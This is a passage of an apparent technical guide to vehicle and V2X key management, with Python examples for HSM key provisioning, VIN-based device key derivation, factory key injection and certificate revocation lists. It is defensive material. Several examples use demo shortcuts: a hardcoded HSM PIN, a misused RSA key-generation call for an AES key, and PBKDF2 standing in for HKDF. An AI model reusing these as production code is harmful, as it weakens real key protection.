# Example: Secure key provisioning flow
def demo_hsm_provisioning():
    hsm = HSMInterface(hsm_slot=0, pin="123456")
    hsm.open_session()

    # Generate enrollment key pair (long-term, non-exportable)
    enrollment_key_handle, enrollment_pubkey = hsm.generate_ecc_keypair(
        key_label="VEHICLE_ENROLLMENT_KEY",
        curve="P-256",
        exportable=False
    )

    # Export public key for CA signing
    hsm.export_public_key(enrollment_key_handle, "/tmp/enrollment_pubkey.pem")

    # Generate firmware signing key (OEM root of trust)
    fw_signing_key_handle, fw_pubkey = hsm.generate_rsa_keypair(
        key_label="OEM_FIRMWARE_SIGNING_KEY",
        key_size=4096,
        exportable=False
    )

    # Sign firmware image
    firmware_data = b"FIRMWARE_IMAGE_BINARY_DATA" * 1000
    signature = hsm.sign_data(fw_signing_key_handle, firmware_data, algorithm="SHA256")

    # Generate symmetric key for data encryption
    aes_key_handle, _ = hsm.generate_rsa_keypair(
        key_label="DATA_ENCRYPTION_KEY",
        key_size=256,  # Actually AES-256, not RSA
        exportable=False
    )

    # Encrypt telemetry data
    telemetry_data = b"VEHICLE_TELEMETRY_JSON_DATA"
    encrypted = hsm.encrypt_data(aes_key_handle, telemetry_data)

    hsm.close_session()

if __name__ == "__main__":
    demo_hsm_provisioning()
```

## Secure Key Provisioning (Factory)

```python
#!/usr/bin/env python3
"""
Secure Key Provisioning for Vehicle Manufacturing
Keys injected during production in secure facility
"""

import secrets
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SecureKeyProvisioning:
    """Factory key injection system"""

    def __init__(self):
        self.master_key = None
        self.provisioned_devices = {}

    def load_master_key(self, master_key_path: str):
        """Load factory master key (HSM-backed)"""
        print("=== Loading Factory Master Key ===")
        # In production: master key stored in HSM, never exported
        self.master_key = secrets.token_bytes(32)  # AES-256
        print("[INFO] Master key loaded from HSM")

    def derive_device_key(self, vin: str) -> bytes:
        """Derive unique device key from VIN using KDF"""
        print(f"\n=== Deriving Device Key for VIN: {vin} ===")

        # HKDF (HMAC-based Key Derivation Function)
        salt = b"VEHICLE_KEY_DERIVATION_SALT"
        info = vin.encode('utf-8')

        # Simplified HKDF (use cryptography.hazmat.primitives.kdf.hkdf in production)
        prk = hashlib.pbkdf2_hmac('sha256', self.master_key, salt, 100000)
        okm = hashlib.pbkdf2_hmac('sha256', prk, info, 1)[:32]

        print(f"[INFO] Device key derived (32 bytes)")
        return okm

    def provision_vehicle(self, vin: str, ecu_serial: str):
        """Provision cryptographic keys to vehicle ECU"""
        print(f"\n=== Vehicle Key Provisioning ===")
        print(f"[INFO] VIN: {vin}")
        print(f"[INFO] ECU Serial: {ecu_serial}")

        # Derive unique device key
        device_key = self.derive_device_key(vin)

        # Generate enrollment private key
        from cryptography.hazmat.primitives.asymmetric import ec
        enrollment_key = ec.generate_private_key(ec.SECP256R1(), default_backend())

        # Encrypt private key with device key (for secure storage in ECU flash)
        encrypted_key = self._encrypt_key(enrollment_key, device_key)

        # Program to ECU secure storage
        provisioning_data = {
            "vin": vin,
            "ecu_serial": ecu_serial,
            "device_key_hash": hashlib.sha256(device_key).hexdigest(),
            "encrypted_enrollment_key": encrypted_key.hex(),
            "provisioning_timestamp": "2026-03-19T12:00:00Z"
        }

        self.provisioned_devices[vin] = provisioning_data

        print(f"[PASS] Vehicle provisioned successfully")
        print(f"[INFO] Keys stored in ECU secure flash")

        return provisioning_data

    def _encrypt_key(self, private_key, device_key: bytes) -> bytes:
        """Encrypt private key with device key using AES-256-GCM"""
        from cryptography.hazmat.primitives import serialization

        # Serialize private key
        key_bytes = private_key.private_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        # Encrypt with AES-256-GCM
        iv = secrets.token_bytes(12)
        cipher = Cipher(
            algorithms.AES(device_key),
            modes.GCM(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(key_bytes) + encryptor.finalize()

        # Return IV + ciphertext + tag
        return iv + ciphertext + encryptor.tag

# Example usage
def demo_factory_provisioning():
    provisioner = SecureKeyProvisioning()
    provisioner.load_master_key("/secure/master_key.bin")

    # Provision 3 vehicles
    vins = [
        "1HGBH41JXMN109186",
        "5YJSA1E26HF123456",
        "WBAJE5C59HG987654"
    ]

    for i, vin in enumerate(vins):
        provisioner.provision_vehicle(vin, f"ECU-TCU-{1000 + i}")

    print(f"\n=== Provisioning Complete ===")
    print(f"[INFO] {len(provisioner.provisioned_devices)} vehicles provisioned")

if __name__ == "__main__":
    demo_factory_provisioning()
```

## Certificate Revocation (CRL/OCSP)

```python
#!/usr/bin/env python3
"""
Certificate Revocation List (CRL) and OCSP Implementation
"""

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import ExtensionOID
from datetime import datetime, timedelta

class CertificateRevocationManager:
    """Manage certificate revocation for V2X PKI"""

    def __init__(self, ca_cert, ca_key):
        self.ca_cert = ca_cert
        self.ca_key = ca_key
        self.revoked_certs = []

    def revoke_certificate(self, cert_serial: int, reason: str = "unspecified"):
        """Add certificate to revocation list"""
        print(f"\n=== Revoking Certificate ===")
        print(f"[INFO] Serial: {cert_serial}")
        print(f"[INFO] Reason: {reason}")

        revocation_date = datetime.utcnow()

        revoked_cert = x509.RevokedCertificateBuilder().serial_number(
            cert_serial
        ).revocation_date(
            revocation_date
        ).add_extension(
            x509.CRLReason(x509.ReasonFlags[reason]),
            critical=False
        ).build(default_backend())

        self.revoked_certs.append(revoked_cert)

        print(f"[PASS] Certificate revoked")

    def generate_crl(self, output_path: str):
        """Generate Certificate Revocation List"""
        print(f"\n=== Generating CRL ===")

        builder = x509.CertificateRevocationListBuilder()
        builder = builder.issuer_name(self.ca_cert.subject)
        builder = builder.last_update(datetime.utcnow())
        builder = builder.next_update(datetime.utcnow() + timedelta(days=7))

        for revoked_cert in self.revoked_certs:
            builder = builder.add_revoked_certificate(revoked_cert)

        crl = builder.sign(self.ca_key, hashes.SHA256(), default_backend())

        with open(output_path, 'wb') as f:
            f.write(crl.public_bytes(serialization.Encoding.PEM))

        print(f"[INFO] CRL generated: {output_path}")
        print(f"[INFO] Revoked certificates: {len(self.revoked_certs)}")
        print(f"[INFO] Valid until: {crl.next_update}")

        return crl

    def check_certificate_status(self, cert_serial: int) -> bool:
        """Check if certificate is revoked (OCSP-like check)"""
        for revoked_cert in self.revoked_certs:
            if revoked_cert.serial_number == cert_serial:
                print(f"[WARN] Certificate {cert_serial} is REVOKED")
                return False

        print(f"[PASS] Certificate {cert_serial} is VALID")
        return True

# Example usage
def demo_crl():
    # Create dummy CA
    from cryptography.hazmat.primitives.asymmetric import rsa

    ca_key = rsa.generate_private_key(65537, 4096, default_backend())
    ca_cert = x509.CertificateBuilder().subject_name(
        x509.Name([x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, "Test CA")])
    ).issuer_name(
        x509.Name([x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, "Test CA")])
    ).public_key(
        ca_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.utcnow()
    ).not_valid_after(
        datetime.utcnow() + timedelta(days=365)
    ).sign(ca_key, hashes.SHA256(), default_backend())

    # Revoke compromised certificates
    crl_mgr = CertificateRevocationManager(ca_cert, ca_key)
    crl_mgr.revoke_certificate(12345678, reason="key_compromise")
    crl_mgr.revoke_certificate(87654321, reason="cessation_of_operation")

    # Generate CRL
    crl_mgr.generate_crl("/tmp/v2x_crl.pem")

    # Check status
    crl_mgr.check_certificate_status(12345678)  # Revoked
    crl_mgr.check_certificate_status(99999999)  # Valid

if __name__ == "__main__":
    demo_crl()
```

## Best Practices

1. **Key Storage**: Always use HSM for private keys in production
2. **Certificate Rotation**: Rotate pseudonym certificates weekly for privacy
3. **CRL Distribution**: Use CDN for CRL distribution, OCSP for real-time checks
4. **Algorithm Selection**: Use ECC (P-256/P-384) for constrained devices, RSA-4096 for CAs
5. **Quantum Readiness**: Plan migration to post-quantum algorithms (CRYSTALS-Dilithium)

## References

- IEEE 1609.2: Security Services for V2V/V2I Communications
- ETSI TS 103 097: Security Header and Certificate Formats
- ISO 21434: Cybersecurity Engineering
- NIST SP 800-57: Key Management Recommendations
